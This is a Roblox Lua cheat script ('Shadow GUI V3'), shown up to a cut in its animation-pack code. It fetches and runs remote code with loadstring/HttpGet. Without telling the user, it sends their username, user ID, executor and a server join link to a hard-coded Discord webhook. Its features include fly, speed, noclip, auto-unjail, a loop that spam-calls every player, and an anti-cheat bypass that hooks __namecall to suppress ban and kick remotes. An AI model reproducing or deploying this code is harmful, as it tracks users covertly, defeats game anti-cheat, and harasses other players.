
local Atlas = loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostDuckyy/UI-Libraries/refs/heads/main/Atlas%20UI%20Library/source.lua"))()

if not game:IsLoaded() then
    game.Loaded:Wait() 
 end


 getgenv().ScriptName = "Shadow GUI"




local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/qvrwd/etarry/main/libraries/notification/akalinotif"))()




function Notif(txt, time)
    
local Notify = NotifyLibrary.Notify
Notify({
	Title = "Shadow GUI",
	Description = txt,
	Duration = time
})

end






 if getgenv().ShadowGuiv3Loaded == true then
    Notif("Shadow Gui Already Loaded, You Can Reexecute it when you rejoin", 10)
    return
end



local url = "https://discord.com/api/webhooks/1291652147997311048/Z5Rc_KgD7-JKmGurGxD1e61x7Vbijk-jTodPro4_8kgbjaTymo0kjJGl--gE1lX2btYq" 

local player = game:GetService("Players").LocalPlayer

local data = {
    content = "",
    embeds = {
        {
            title = "Execution Logs",
            type = "rich",
            color = tonumber(0xFFFFFF),  
            fields = {
                {
                    name = "Username",
                    value = player.Name,
                    inline = true
                },
                {
                    name = "DisplayName",
                    value = tostring(player.DisplayName),
                    inline = true
                },
                {
                    name = "UserID",
                    value = tostring(player.UserId),
                    inline = true
                },
                {
                    name = "Script",
                    value = getgenv().ScriptName or "Unknown",
                    inline = true
                },
                {
                    name = "Executor",
                    value = identifyexecutor() or "Unknown",
                    inline = true
                },
                {
                    name = "Link To Profile",
                    value = "[Profile](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
                    inline = true
                },
                {
                    name = "Bug",
                    value = "Not a report",
                    inline = false
                },
                {
                    name = "Execute This To Join Them:",
                    value = "```game:GetService('TeleportService'):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. game.JobId .. "')```",
                    inline = false
                },
                {
                    name = "Join Link:",
                    value = "```https://www.roblox.com/games/start?launchData=" .. game.JobId .. "&placeId=" .. game.PlaceId .. "```",
                    inline = false
                }
            },
            image = {
                url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. player.Name
            }
        }
    }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}

local request = http_request or request or HttpPost or syn.request
local requestData = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(requestData)


getgenv().ShadowGuiv3Loaded = true

local UI = Atlas.new({
    Name = "Shadow Gui V3 [Beta]"; -- script name (required)
    ConfigFolder = nil;
    Credit = "Made By faisal8754 and vanillacupcake124"; -- text to appear if player presses the "i" button on their UI (optional)
    Color = Color3.fromRGB(0, 0, 255);
    Bind = "LeftControl"; -- keybind for toggling the UI, must be a valid KeyCode name
    UseLoader = false; -- whether to use Atlas Loader or not, if set to false than CheckKey and Discord are ignored
    FullName = "Shadow GUI V3 [Beta]"; -- works if UseLoader is set to true, can be same as Name argument, shown on loader frame
    Discord = "https://discord.gg/GYe24JTTDT"; -- works if UseLoader is set to true, will be copied to clipboard if player presses "Copy Invite" button
})


local MyPage = UI:CreatePage("Home") -- creates a section in page with the name passed. This argument is reqiured.
local MySection = MyPage:CreateSection("Home:")

local MyParagraph = MySection:CreateParagraph("Hello world!") -- creates a paragraph element with "Hello world!" as the text content

MyParagraph.Set("Made By: faisal8754 and vanillacupcake124")

local MyParagraph1 = MySection:CreateParagraph("Hello world!") -- creates a paragraph element with "Hello world!" as the text content

MyParagraph1.Set("Executor: " .. identifyexecutor())


MySection:CreateButton({
	Name = "Copy Discord Server"; -- required: name of element
	Callback = function()  -- required: function to be called when button is pressed
		setclipboard("https://discord.gg/GYe24JTTDT")
	end
})



MySection:CreateButton({
	Name = "Redirect To Discord Server";
	Callback = function()
        local data = {
            ["cmd"] = "INVITE_BROWSER",
            ["args"] = {
                ["code"] = "baWuUxcN7w"
            },
            ["nonce"] = game:GetService("HttpService"):GenerateGUID(true)
        }
        
        local http_request = syn and syn.request or http_request or request
        
        local success, response = pcall(function()
            return http_request({
                Url = "http://127.0.0.1:6463/rpc?v=1",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["Origin"] = "https://discord.com"
                },
                Body = game:GetService("HttpService"):JSONEncode(data)
            })
        end)
        
	end
})












--------------------------------------- main tab ------------------------------------------------------------------------------------------

local MainPage = UI:CreatePage("Main") -- creates a section in page with the name passed. This argument is reqiured.
local SelectionMain = MainPage:CreateSection("Main:")



SelectionMain:CreateButton({
	Name = "Fly(X)";
	Callback = function()
        local RunService = game:GetService("RunService")
        local Workspace = game:GetService("Workspace")
        RunService.Heartbeat:Connect(function()
            local camera = Workspace:FindFirstChild("Camera")
            if camera and camera:IsA("Camera") then
                camera.CameraType = Enum.CameraType.Custom
            end
        end)
		repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Head
	local flying = false
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 5000
	local speed = 5000
	function Fly()
		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
			plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = true
			if ctrl.l + ctrl.r ~= 100000 or ctrl.f + ctrl.b ~= 10000 then
				speed = speed+.0+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 5 or ctrl.f + ctrl.b ~= 5) and speed ~= 5 then
				speed = speed-5
				if speed > 5 then
					speed = -2
				end
			end
			if (ctrl.l + ctrl.r) ~= 5 or (ctrl.f + ctrl.b) ~= 5 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 5 and (ctrl.f + ctrl.b) == 5 and speed ~= 5 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0.1,0)
			end
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not flying
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 5
		bg:Destroy()
		bv:Destroy()
		plr.Character:FindFirstChildWhichIsA('Humanoid').PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)
		if key:lower() == "x" then
			if flying then flying = false
			else
				flying = true
				Fly()
			end
		elseif key:lower() == "w" then
			ctrl.f = 20
		elseif key:lower() == "s" then
			ctrl.b = -20
		elseif key:lower() == "a" then
			ctrl.l = -20
		elseif key:lower() == "d" then
			ctrl.r = 20
		end
	end)
	mouse.KeyUp:connect(function(key)
		if key:lower() == "w" then
			ctrl.f = 0
		elseif key:lower() == "s" then
			ctrl.b = 0
		elseif key:lower() == "a" then
			ctrl.l = 0
		elseif key:lower() == "d" then
			ctrl.r = 0
		end
	end)
	Fly()        
	end
})





SelectionMain:CreateButton({
	Name = "Car Fly(P)";
	Callback = function()
        local Services = game:GetService("Players")
        local key = "P" 
        local Key = tostring(key)
        local mouse = Services.LocalPlayer:GetMouse()
        local flying = false 
        local ctrl = {f = 0, b = 0, l = 0, r = 0} 
        local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
        local maxspeed = 5
        local speed = 2
        
        function Fly() 
            local Car = workspace.Vehicles:FindFirstChild(Services.LocalPlayer.Name)
            local Humanoid = Instance.new("Humanoid", Car)
        
            if not Car then 
                return 
            end 
        
            if Car:FindFirstChild("BodyVelocity") then 
                Car.BodyVelocity:Destroy()
            end 
        
            if Car:FindFirstChild("BodyGyro") then 
                Car.BodyGyro:Destroy()
            end 
        
            local BodyGyro = Instance.new("BodyGyro", Car) 
            local BodyVelocity = Instance.new("BodyVelocity", Car) 
        
            BodyGyro.P = 9e4 
            BodyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
            BodyGyro.cframe = Car.CFrame 
        
            BodyVelocity.velocity = Vector3.new(0, 0.1, 0) 
            BodyVelocity.maxForce = Vector3.new(9e9, 9e9, 9e9) 
        
            repeat task.wait() 
                Humanoid.PlatformStand = true 
                if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
                    speed = speed + 0.0 + 100000 
                    if speed > maxspeed then 
                        speed = maxspeed 
                    end 
                elseif speed ~= 5 then 
                    speed = speed - 5
                    if speed < 2 then 
                        speed = 2 
                    end 
                end 
                
                if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
                    BodyVelocity.velocity = ((workspace.CurrentCamera.CFrame.lookVector * (ctrl.f + ctrl.b)) + ((workspace.CurrentCamera.CFrame * CFrame.new(ctrl.l + ctrl.r, (ctrl.f + ctrl.b) * .2, 0).p) - workspace.CurrentCamera.CFrame.p)) * speed 
                    lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
                else 
                    BodyVelocity.velocity = Vector3.new(0, 0.1, 0) 
                end 
        
                BodyGyro.cframe = workspace.CurrentCamera.CFrame * CFrame.Angles(-math.rad((ctrl.f + ctrl.b) * 50 * speed/maxspeed), 0, 0) 
            until not flying 
            ctrl = {f = 0, b = 0, l = 0, r = 0} 
            lastctrl = {f = 0, b = 0, l = 0, r = 0} 
            speed = 5 
            BodyGyro:Destroy() 
            BodyVelocity:Destroy() 
            Humanoid.PlatformStand = false 
        end 
        
        mouse.KeyDown:Connect(function(key) 
            if key:lower() == Key:lower() then 
                flying = not flying
                if flying then 
                    Fly() 
                end 
            elseif key:lower() == "w" then 
                ctrl.f = 45
            elseif key:lower() == "s" then 
                ctrl.b = -45 
            elseif key:lower() == "a" then 
                ctrl.l = -45 
            elseif key:lower() == "d" then 
                ctrl.r = 45
            end 
        end) 
        
        mouse.KeyUp:Connect(function(key) 
            if key:lower() == "w" then 
                ctrl.f = 0
            elseif key:lower() == "s" then 
                ctrl.b = 0
            elseif key:lower() == "a" then 
                ctrl.l = 0
            elseif key:lower() == "d" then 
                ctrl.r = 0
            end 
        end)            
	end
})







SelectionMain:CreateButton({
	Name = "Super Speed(c)";
	Callback = function() 
        superhuman = false
        plr = game.Players.LocalPlayer
        mouse = plr:GetMouse()
        mouse.KeyDown:connect(function(key)
            if key == "c" and superhuman == false then
                superhuman = true
                game.Players.LocalPlayer.Character.Humanoid.Name = "Humz"
                game.Players.LocalPlayer.Character.Humz.WalkSpeed = 100
            elseif key == "c" and superhuman == true then
                superhuman = false
                game.Players.LocalPlayer.Character.Humz.WalkSpeed = 16
                game.Players.LocalPlayer.Character.Humz.Name = "Humanoid"
            end
        end)         
	end
})


SelectionMain:CreateButton({
	Name = "Inf Zoom";
	Callback = function() 
        game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge      
	end
})



SelectionMain:CreateButton({
	Name = "Force Reset";
	Callback = function() 
    resetsavepos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
    wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v:IsA('Accessory') then
            v.Handle:Destroy()
        end
    end
    for _,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") or v:IsA("Part") or v:IsA("MeshPart") then
            v:Remove()
        end
    end
    wait(game:GetService("Players").RespawnTime+1.5)
    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(resetsavepos)   
	end
})





SelectionMain:CreateButton({
	Name = "Mask Names";
	Callback = function() 
        for _, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v and v.Character and v.Character:FindFirstChildOfClass("Humanoid") and v.Character:FindFirstChildOfClass("Humanoid").DisplayDistanceType ~= Enum.HumanoidDisplayDistanceType.Viewer then
                v.Character:FindFirstChildOfClass("Humanoid").DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
            end
        end
	end
})



SelectionMain:CreateButton({
	Name = "Mute Boombox";
	Callback = function() 
        for _,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Character.LowerTorso:findFirstChild("BOOMBOXSOUND") and v.Name ~= game:GetService("Players").LocalPlayer.Name then
                if v.Character.LowerTorso:findFirstChild("BOOMBOXSOUND").Playing == true then
                    v.Character.LowerTorso:findFirstChild("BOOMBOXSOUND").Playing = false
                end
            end
        end
	end
})


isSpeedEnabled = false
tspeed = 1

game:GetService("RunService").RenderStepped:Connect(function()
    if isSpeedEnabled and game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid") then
        if game:GetService("Players").LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
            game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(game:GetService("Players").LocalPlayer.Character.PrimaryPart.CFrame + game:GetService("Players").LocalPlayer.Character.Humanoid.MoveDirection * tspeed)
        end
    else
        if game:GetService("Players").LocalPlayer.Character then
            game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(game:GetService("Players").LocalPlayer.Character.PrimaryPart.CFrame)
        end
    end
end)

SelectionMain:CreateToggle({
    Name = "Cframe Speed",
    Flag = "Cframe Speed"; 
    Default = false,
    Callback = function(state)
        isSpeedEnabled = state
    end,
})



local noclipEnabled = false
local connection

SelectionMain:CreateToggle({
    Name = "No Clip",
    Flag = "No Clip"; 
    Default = false,
    Callback = function(isenablednoclip)
        noclipEnabled = isenablednoclip

if noclipEnabled then
    if not connection then
        connection = game:GetService("RunService").Stepped:Connect(function()
            for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if part:IsA('BasePart') then
                    part.CanCollide = false
                end
            end
        end)
    end
else
    if connection then
        connection:Disconnect()
        connection = nil

        for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if part:IsA('BasePart') then
                part.CanCollide = true
            end
        end
    end
end

    end,
})






SelectionMain:CreateToggle({
    Name = "No Fog",
    Flag = "No Fog";
    Default = false,
    Callback = function(fogenabled)
        if fogenabled then
            game:GetService("Lighting").FogEnd = 5000
        else
            game:GetService("Lighting").FogEnd = 500
        end
    end
})



SelectionMain:CreateToggle({
    Name = "CallAll",
    Flag = "CallAll",
    Default = false,
    Callback = function(callallyes)
        if callallyes then
            callall = true
            while callall do
                for i, v in next, game:GetService("Players"):GetPlayers() do
                    game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
                    wait()
                    if game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]") then
                        game.Players.LocalPlayer.Backpack:FindFirstChild("[Phone]").Parent = game.Players.LocalPlayer.Character
                    end
                    wait()
                    game:GetService("ReplicatedStorage").MainEvent:FireServer("PhoneCall", v.Name)
                end
            end
        else
            callall = false
        end
    end
})



SelectionMain:CreateToggle({
    Name = "Auto Unjail",
    Flag = "Auto Unjail",
    Default = false,
    Callback = function(isEnabled)
        _G.autounjail = isEnabled
    end
})

_G.unjailing = false

game:GetService("RunService").Stepped:Connect(function()
    wait()

    if _G.autounjail then
        if not _G.unjailing then
            _G.unjailing = true
            
            pcall(function()
                for _, animation in next, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
                    if animation.Animation.AnimationId:match("rbxassetid://3144026747") then
                        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR")

                        wait()
                        repeat wait()
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Key] - $133"].Head.CFrame
                            fireclickdetector(game.Workspace.Ignored.Shop["[Key] - $133"].ClickDetector)
                        until game.Players.LocalPlayer.Backpack:FindFirstChild("[Key]")

                        wait(0.1)
                        if game.Players.LocalPlayer.Backpack:FindFirstChild("[Key]") then
                            game.Players.LocalPlayer.Backpack:FindFirstChild("[Key]").Parent = game.Players.LocalPlayer.Character
                            wait(0.5)
                            repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR")
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-319.2906494140625, 80.41372680664062, -210.28460693359375)
                        end
                    end
                end
            end)
            _G.unjailing = false
        end
    else
        _G.unjailing = false
    end
end)


SelectionMain:CreateButton({
	Name = "Anti Cheat Bypass";
	Callback = function() 
        if identifyexecutor() == "Solara" then
            error("Your Executor Doesnt Support Anti Cheat Bypass")
        else
            grm = getrawmetatable(game)
            setreadonly(grm, false)
            old = grm.__namecall
            grm.__namecall = newcclosure(function(self, ...)
                local args = {...}
                if tostring(args[1]) == "TeleportDetect" then
                    return
                elseif tostring(args[1]) == "CHECKER_1" then
                    return
                elseif tostring(args[1]) == "CHECKER" then
                    return
                elseif tostring(args[1]) == "GUI_CHECK" then
                    return
                elseif tostring(args[1]) == "OneMoreTime" then
                    return
                elseif tostring(args[1]) == "checkingSPEED" then
                    return
                elseif tostring(args[1]) == "BANREMOTE" then
                    return
                elseif tostring(args[1]) == "PERMAIDBAN" then
                    return
                elseif tostring(args[1]) == "KICKREMOTE" then
                    return
                elseif tostring(args[1]) == "BR_KICKPC" then
                    return
                elseif tostring(args[1]) == "BR_KICKMOBILE" then
                    return
                end
                return old(self, ...)
            end)
        end       
	end
})






 SelectionMain:CreateButton({
	Name = "Anti Afk";
	Callback = function() 
        game:GetService("Players").LocalPlayer.Idled:Connect(function()
            game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0), game:GetService("Workspace").CurrentCamera.CFrame)
            wait(1)
            game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0), game:GetService("Workspace").CurrentCamera.CFrame)
         end)         
	end
})







SelectionMain:CreateButton({
	Name = "Unjail";
	Callback = function() 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Key] - $133"].Head.CFrame
        wait(.3)
        fireclickdetector(game.Workspace.Ignored.Shop["[Key] - $133"].ClickDetector)
        wait(1)
        if game.Players.LocalPlayer.Backpack:FindFirstChild("[Key]") then
        game.Players.LocalPlayer.Backpack:FindFirstChild("[Key]").Parent = game.Players.LocalPlayer.Character
        end
        wait(.5)
        game.Players.LocalPlayer.Character:FindFirstChild('[Key]'):Activate()
        wait(.5)
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-319.2906494140625, 80.41372680664062, -210.28460693359375)
	end
})




SelectionMain:CreateButton({
	Name = "Get All lockpicker/knife";
	Callback = function() 
        local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
        for h, i in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
            if i.Name == "Part" then
                if i:FindFirstChild("[LockPicker]") or i:FindFirstChild("[Knife]") then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame;
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.Position).Magnitude <= 50 then
                        wait()
                    end
                end
            end
        end;
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
        
	end
})



SelectionMain:CreateButton({
	Name = "Animation Pack ++";
	Callback = function() 
        repeat
            wait()
        until game:IsLoaded() and game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack")
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Lean") then
            game.ReplicatedStorage.ClientAnimations.Lean:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Lay") then
            game.ReplicatedStorage.ClientAnimations.Lay:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Dance1") then
            game.ReplicatedStorage.ClientAnimations.Dance1:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Dance2") then
            game.ReplicatedStorage.ClientAnimations.Dance2:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Greet") then
            game.ReplicatedStorage.ClientAnimations.Greet:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Chest Pump") then
            game.ReplicatedStorage.ClientAnimations["Chest Pump"]:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Praying") then
            game.ReplicatedStorage.ClientAnimations.Praying:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("TheDefault") then
            game.ReplicatedStorage.ClientAnimations.TheDefault:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Sturdy") then
            game.ReplicatedStorage.ClientAnimations.Sturdy:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Rossy") then
            game.ReplicatedStorage.ClientAnimations.Rossy:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Griddy") then
            game.ReplicatedStorage.ClientAnimations.Griddy:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("TPose") then
            game.ReplicatedStorage.ClientAnimations.TPose:Destroy()
        end
        
        if game.ReplicatedStorage.ClientAnimations:FindFirstChild("SpeedBlitz") then
            game.ReplicatedStorage.ClientAnimations.SpeedBlitz:Destroy()
        end
        
        local Animations = game.ReplicatedStorage.ClientAnimations
        
        local LeanAnimation = Instance.new("Animation", Animations)
        LeanAnimation.Name = "Lean"
        LeanAnimation.AnimationId = "rbxassetid://3152375249"
        
        local LayAnimation = Instance.new("Animation", Animations)
        LayAnimation.Name = "Lay"
        LayAnimation.AnimationId = "rbxassetid://3152378852"
        
        local Dance1Animation = Instance.new("Animation", Animations)
        Dance1Animation.Name = "Dance1"
        Dance1Animation.AnimationId = "rbxassetid://3189773368"
        
        local Dance2Animation = Instance.new("Animation", Animations)
        Dance2Animation.Name = "Dance2"
        Dance2Animation.AnimationId = "rbxassetid://3189776546"
        
        local GreetAnimation = Instance.new("Animation", Animations)
        GreetAnimation.Name = "Greet"
        GreetAnimation.AnimationId = "rbxassetid://3189777795"
        
        local ChestPumpAnimation = Instance.new("Animation", Animations)
        ChestPumpAnimation.Name = "Chest Pump"
        ChestPumpAnimation.AnimationId = "rbxassetid://3189779152"
        
        local PrayingAnimation = Instance.new("Animation", Animations)
        PrayingAnimation.Name = "Praying"
        PrayingAnimation.AnimationId = "rbxassetid://3487719500"
        
        local TheDefaultAnimation = Instance.new("Animation", Animations)
        TheDefaultAnimation.Name = "TheDefault"
        TheDefaultAnimation.AnimationId = "rbxassetid://11710529975"
        
        local SturdyAnimation = Instance.new("Animation", Animations)
        SturdyAnimation.Name = "Sturdy"
        SturdyAnimation.AnimationId = "rbxassetid://11710524717"
        
        local RossyAnimation = Instance.new("Animation", Animations)
        RossyAnimation.Name = "Rossy"
        RossyAnimation.AnimationId = "rbxassetid://11710527244"
        
        local GriddyAnimation = Instance.new("Animation", Animations)
        GriddyAnimation.Name = "Griddy"
        GriddyAnimation.AnimationId = "rbxassetid://11710529220"
        
        local TPoseAnimation = Instance.new("Animation", Animations)
        TPoseAnimation.Name = "TPose"
        TPoseAnimation.AnimationId = "rbxassetid://11710524200"
        
        local SpeedBlitzAnimation = Instance.new("Animation", Animations)
        SpeedBlitzAnimation.Name = "SpeedBlitz"
        SpeedBlitzAnimation.AnimationId = "rbxassetid://11710541744"
        
        function AnimationPack(Character)
            Character:WaitForChild'Humanoid'
            repeat
                wait()
            until game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack")
        
            local AnimationPack = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPack
            local AnimationPackPlus = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPlusPack
            local ScrollingFrame = AnimationPack.ScrollingFrame
            local CloseButton = AnimationPack.CloseButton
            local ScrollingFramePlus = AnimationPackPlus.ScrollingFrame
            local CloseButtonPlus = AnimationPackPlus.CloseButton
        
            local Lean = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LeanAnimation)
        
            local Lay = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LayAnimation)
        
            local Dance1 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance1Animation)
        
            local Dance2 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance2Animation)
        
            local Greet = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GreetAnimation)
        
            local ChestPump = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ChestPumpAnimation)
        
            local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)
        
            local TheDefault = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(TheDefaultAnimation)
        
            local Sturdy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(SturdyAnimation)
        
            local Rossy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(RossyAnimation)
        
            local Griddy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GriddyAnimation)
        
            local TPose = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(TPoseAnimation)
        
            local SpeedBlitz = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(SpeedBlitzAnimation)
        
            AnimationPack.Visible = true
        
            AnimationPackPlus.Visible = true
        
            ScrollingFrame.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        
            ScrollingFramePlus.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        
            for i,v in pairs(ScrollingFrame:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Lean" then
                        v.Name = "LeanButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFrame:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Lay" then
                        v.Name = "LayButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFrame:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Dance1" then
                        v.Name = "Dance1Button"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFrame:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Dance2" then
                        v.Name = "Dance2Button"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFrame:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Greet" then
                        v.Name = "GreetButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFrame:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Chest Pump" then
                        v.Name = "ChestPumpButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFrame:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Praying" then
                        v.Name = "PrayingButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFramePlus:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "The Default" then
                        v.Name = "TheDefaultButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFramePlus:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Sturdy" then
                        v.Name = "SturdyButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFramePlus:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Rossy" then
                        v.Name = "RossyButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFramePlus:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Griddy" then
                        v.Name = "GriddyButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFramePlus:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "T Pose" then
                        v.Name = "TPoseButton"
                    end
                end
            end
        
            for i,v in pairs(ScrollingFramePlus:GetChildren()) do
                if v.Name == "TextButton" then
                    if v.Text == "Speed Blitz" then
                        v.Name = "SpeedBlitzButton"
                    end
                end
            end
        
            function Stop()
                Lean:Stop()
                Lay:Stop()
                Dance1:Stop()
                Dance2:Stop()
                Greet:Stop()
                ChestPump:Stop()
                Praying:Stop()
                TheDefault:Stop()
                Sturdy:Stop()
                Rossy:Stop()
                Griddy:Stop()
                TPose:Stop()
                SpeedBlitz:Stop()
            end
        
        
            local LeanTextButton = ScrollingFrame.LeanButton
            local LayTextButton = ScrollingFrame.LayButton
            local Dance1TextButton = ScrollingFrame.Dance1Button
            local Dance2TextButton = ScrollingFrame.Dance2Button
            local GreetTextButton = ScrollingFrame.GreetButton
